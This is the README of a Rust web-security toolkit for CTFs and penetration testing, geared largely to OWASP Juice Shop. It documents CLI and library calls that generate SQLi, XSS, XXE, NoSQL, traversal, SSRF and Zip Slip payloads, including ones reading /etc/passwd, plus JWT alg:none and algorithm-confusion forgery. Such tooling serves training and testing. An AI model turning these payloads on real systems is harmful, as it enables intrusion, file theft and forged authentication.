# Web Security Toolkit

A comprehensive Rust-based toolkit for web security testing, CTF challenges, and penetration testing.

## Features

| Module | Description | CLI Tool |
|--------|-------------|----------|
| **encoding** | Z85, Base64, Hex, ROT13 | `encoder` |
| **jwt** | JWT manipulation, unsigned JWT, algorithm confusion | `jwt-tool` |
| **sqli** | SQL injection payloads (SQLite, MySQL, PostgreSQL) | `payload-gen sqli` |
| **xss** | XSS payloads with filter bypass techniques | `payload-gen xss` |
| **xxe** | XXE payloads for file read, SSRF, DoS | `payload-gen xxe` |
| **nosql** | MongoDB injection payloads | `payload-gen nosql` |
| **traversal** | Path traversal and LFI payloads | `payload-gen traversal` |
| **ssrf** | SSRF bypass techniques | `ssrf-scanner` |
| **zip_payload** | Zip Slip payloads | `zip-payload` |
| **passwords** | Common passwords, hash identification | `payload-gen passwords` |

## Installation

```bash
cargo build --release
```

## CLI Tools

### encoder

```bash
# Z85 encoding (Juice Shop coupon)
encoder juice-coupon JAN 26 90

# Base64/Hex/Z85
encoder encode base64 "secret"
encoder decode z85 "encoded"
encoder rot13 "text"
```

### jwt-tool

```bash
# Decode JWT
jwt-tool decode "eyJhbGciOiJIUzI1NiIs..."

# Create unsigned JWT (alg: none attack)
jwt-tool unsigned '{"role": "admin"}'

# Algorithm confusion (RS256 -> HS256)
jwt-tool hs256 '{"role": "admin"}' "public-key-content"

# Juice Shop hints
jwt-tool juice-shop
```

### payload-gen

```bash
# SQL injection
payload-gen sqli auth-bypass
payload-gen sqli union 9
payload-gen sqli juice-shop

# XSS
payload-gen xss basic
payload-gen xss bypass
payload-gen xss juice-shop

# XXE
payload-gen xxe file /etc/passwd
payload-gen xxe juice-shop

# NoSQL
payload-gen nosql auth-bypass
payload-gen nosql juice-shop

# Path traversal
payload-gen traversal 5 etc/passwd

# Passwords
payload-gen passwords top
payload-gen passwords juice-shop
```

### ssrf-scanner

```bash
ssrf-scanner localhost 3000
ssrf-scanner internal 80
ssrf-scanner juice-shop
```

### zip-payload

```bash
zip-payload juice-shop -o exploit.zip
zip-payload create -o exploit.zip -t "../../etc/passwd" -c "content"
zip-payload list
```

## Library Usage

```rust
use web_security_toolkit::*;

// Encoding
let coupon = z85_encode("JAN26-90");

// JWT
let token = create_unsigned_jwt(&json!({"role": "admin"}));

// SQLi
let payloads = juice_shop_sqli();

// XSS
let xss = juice_shop_xss();

// XXE
let xxe = file_read_xxe("/etc/passwd");

// SSRF
let variants = generate_localhost_variants(3000);
```

## Testing

```bash
cargo test
```

## Supported Challenges

Includes specific payloads for OWASP Juice Shop challenges:

- **Authentication**: SQLi login bypass, password reset
- **JWT**: Unsigned JWT, algorithm confusion
- **Injection**: SQLi, NoSQLi, XXE
- **XSS**: DOM XSS, sanitization bypass, video XSS
- **SSRF**: Profile image URL attack
- **File Access**: Poison null byte, Zip Slip
- **Crypto**: Z85 coupon forgery
